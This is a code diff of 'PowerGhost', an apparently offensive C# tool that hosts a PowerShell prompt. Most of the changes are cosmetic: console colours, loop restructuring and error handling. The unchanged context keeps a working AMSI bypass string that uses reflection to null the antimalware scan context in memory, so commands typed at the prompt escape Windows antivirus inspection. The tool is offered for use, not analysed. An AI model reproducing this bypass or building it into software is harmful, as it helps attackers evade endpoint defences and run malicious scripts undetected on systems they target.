@@ -13,6 +13,11 @@ namespace PowerGhost
             // this is the AMSI bypass
             string bypass = "$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like \"*iutils\") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like \"*Context\") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);";
 
+            Console.Title = "PowerGhost";
+            Console.BackgroundColor = ConsoleColor.DarkRed;
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Clear();
+
             Console.WriteLine("\nPowerGhost by PlackyHacker");
             Console.WriteLine("--------------------------\n");
             Console.WriteLine("Type 'exit' to close.\n");
@@ -31,10 +36,9 @@ namespace PowerGhost
 
             Thread.Sleep(1);
 
-            bool exit = false;
-            
-            while (exit == false)
+            while (true)
             {
+                Console.ForegroundColor = ConsoleColor.White;
                 string dir = Directory.GetCurrentDirectory();
 
                 Console.Write("PG " + dir + "> ");
@@ -42,14 +46,17 @@ namespace PowerGhost
 
 
                 if (input.ToUpper() == "EXIT")
-                    exit = true;
-                else if(input.ToUpper().StartsWith("CD"))
+                {
+                    break;
+                }
+
+                else if (input.ToUpper().StartsWith("CD"))
                 {
                     try
                     {
                         Directory.SetCurrentDirectory(input.Split(' ')[1]);
                     }
-                    catch (Exception ex){ Console.WriteLine(ex.Message); }
+                    catch (Exception ex) { Console.WriteLine(ex.Message); }
                 }
                 else if (string.IsNullOrEmpty(input))
                 {
@@ -59,14 +66,26 @@ namespace PowerGhost
                 input = input.Trim();
                 if (input.EndsWith(";")) input = input.Substring(0, input.Length - 1);
 
-                ps.AddScript(input + " | Out-String");
-                System.Collections.ObjectModel.Collection<PSObject> result = ps.Invoke();
+                if(input != "exit")
+                    ps.AddScript(input + " | Out-String");
 
-                if (result.Count > 0)
+
+
+                try
                 {
-                    string str = result[0].BaseObject as string;
-                    if (!String.IsNullOrEmpty(str))
-                        Console.WriteLine(str.Substring(0, str.Length - 2));
+                    System.Collections.ObjectModel.Collection<PSObject> result = ps.Invoke();
+
+                    if (result.Count > 0)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        string str = result[0].BaseObject as string;
+                        if (!String.IsNullOrEmpty(str))
+                            Console.WriteLine(str.Substring(0, str.Length - 2));
+                    }
+                }
+                catch(Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
                 }
             }
 
